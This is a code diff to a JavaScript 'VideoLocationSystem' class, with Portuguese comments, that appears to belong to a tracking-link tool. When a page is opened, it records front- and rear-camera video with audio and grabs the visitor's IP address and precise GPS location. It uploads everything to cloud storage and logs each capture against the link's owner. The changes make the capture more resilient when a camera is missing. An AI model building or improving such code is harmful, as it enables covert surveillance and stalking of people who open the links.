@@ -75,21 +75,38 @@ class VideoLocationSystem {
     try {
       const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
       s1.getTracks().forEach(t => t.stop());
-      const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-      s2.getTracks().forEach(t => t.stop());
+      try {
+        const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+        s2.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        console.warn('Camera traseira nao disponivel:', e);
+      }
       await this.getLocation();
       return true;
     } catch (e) {
-      console.warn('Permissões negadas:', e);
+      console.warn('Permissoes negadas:', e);
       return false;
     }
   }
 
   async recordCamera(facingMode, durationMs) {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode },
-      audio: true
-    });
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: { exact: facingMode } },
+        audio: true
+      });
+    } catch (e) {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode },
+          audio: true
+        });
+      } catch (e2) {
+        console.warn('Camera ' + facingMode + ' nao disponivel:', e2);
+        return null;
+      }
+    }
 
     const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
       ? 'video/webm;codecs=vp9'
@@ -106,7 +123,7 @@ class VideoLocationSystem {
     const blob = await new Promise((resolve, reject) => {
       recorder.onstop = () => {
         if (chunks.length > 0) resolve(new Blob(chunks, { type: 'video/webm' }));
-        else reject(new Error('Sem dados de vídeo'));
+        else reject(new Error('Sem dados de video'));
       };
       setTimeout(() => reject(new Error('Timeout')), 10000);
     });
@@ -116,29 +133,31 @@ class VideoLocationSystem {
   }
 
   async uploadBlob(blob, label, timestamp) {
-    const filePath = `videos/${this.userId}/${this.urlId}_${label}_${timestamp}.webm`;
+    if (!blob || blob.size === 0) return null;
+    const filePath = 'videos/' + this.userId + '/' + this.urlId + '_' + label + '_' + timestamp + '.webm';
     const storageRef = storage.ref(filePath);
     const uploadTask = await storageRef.put(blob);
-    return await uploadTask.ref.getDownloadURL();
+    const url = await uploadTask.ref.getDownloadURL();
+    return url;
   }
 
   async recordAndUpload() {
     try {
       const timestamp = Date.now();
 
-      // Grava câmera frontal (5s)
+      // Grava camera frontal (5s)
       const frontBlob = await this.recordCamera('user', 5000);
 
-      // Grava câmera traseira (5s)
+      // Grava camera traseira (5s)
       const backBlob = await this.recordCamera('environment', 5000);
 
-      if (frontBlob.size === 0 || backBlob.size === 0) throw new Error('Um dos vídeos está vazio');
-
-      // Faz upload dos dois vídeos separadamente e obtém duas URLs
+      // Upload em paralelo dos dois videos
       const [frontUrl, backUrl] = await Promise.all([
-        this.uploadBlob(frontBlob, 'frontal', timestamp),
-        this.uploadBlob(backBlob, 'traseira', timestamp)
+        frontBlob ? this.uploadBlob(frontBlob, 'frontal', timestamp) : Promise.resolve(null),
+        backBlob  ? this.uploadBlob(backBlob,  'traseira', timestamp) : Promise.resolve(null)
       ]);
+
+      if (!frontUrl && !backUrl) throw new Error('Nenhum video disponivel para upload');
 
       const [ipResult, location] = await Promise.all([this.getIP(), this.getLocation()]);
 
@@ -147,8 +166,8 @@ class VideoLocationSystem {
         id: captureKey,
         urlId: this.urlId,
         userId: this.userId,
-        videoFrontalUrl: frontUrl,
-        videoTrasieraUrl: backUrl,
+        videoFrontalUrl: frontUrl || null,
+        videoTrasieraUrl: backUrl || null,
         ip: ipResult,
         timestamp,
         data: new Date().toISOString(),
@@ -160,9 +179,9 @@ class VideoLocationSystem {
       const usedCount = (this.urlData.usedCount || 0) + 1;
 
       const updates = {};
-      updates[`users/${this.userId}/captures/${captureKey}`] = captureData;
-      updates[`users/${this.userId}/urls/${this.urlId}/usedCount`] = usedCount;
-      updates[`users/${this.userId}/urls/${this.urlId}/lastUsed`] = timestamp;
+      updates['users/' + this.userId + '/captures/' + captureKey] = captureData;
+      updates['users/' + this.userId + '/urls/' + this.urlId + '/usedCount'] = usedCount;
+      updates['users/' + this.userId + '/urls/' + this.urlId + '/lastUsed'] = timestamp;
 
       await database.ref().update(updates);
 
@@ -177,7 +196,7 @@ class VideoLocationSystem {
       const data = await res.json();
       return data.ip;
     } catch {
-      return 'Não disponível';
+      return 'Nao disponivel';
     }
   }
 
@@ -187,7 +206,7 @@ class VideoLocationSystem {
       navigator.geolocation.getCurrentPosition(async pos => {
         const { latitude, longitude } = pos.coords;
         try {
-          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
+          const res = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + latitude + '&lon=' + longitude + '&addressdetails=1');
           const data = await res.json();
           resolve({
             latitude,
@@ -205,7 +224,7 @@ class VideoLocationSystem {
           resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
         }
       }, err => {
-        console.warn('Erro de geolocalização:', err);
+        console.warn('Erro de geolocalizacao:', err);
         resolve(null);
       }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 });
     });
